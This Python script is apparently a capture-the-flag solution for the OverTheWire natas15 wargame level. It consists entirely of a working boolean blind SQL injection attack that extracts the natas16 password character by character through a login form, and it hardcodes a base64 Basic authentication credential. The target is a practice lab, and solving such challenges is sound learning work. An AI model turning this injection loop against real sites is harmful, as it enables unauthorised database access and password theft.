import requests

chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 "
username = ""
burp0_url = "http://natas15.natas.labs.overthewire.org:80/index.php"
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://natas15.natas.labs.overthewire.org", "DNT": "1", "Authorization": "Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==", "Connection": "close", "Referer": "http://natas15.natas.labs.overthewire.org/", "Upgrade-Insecure-Requests": "1"}


while True:
    for char in chars:
        burp0_data = {
            "username": "\" and 0 UNION SELECT 1,username FROM users where username = 'natas16' and password like binary \"{}%\"-- ".format(username+char)}
        answer = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
        if ("doesn't") not in answer.text.split('content">')[1]:
            username=username+char
            print(username)
            break
    if (char == ' '):
        break
print(username)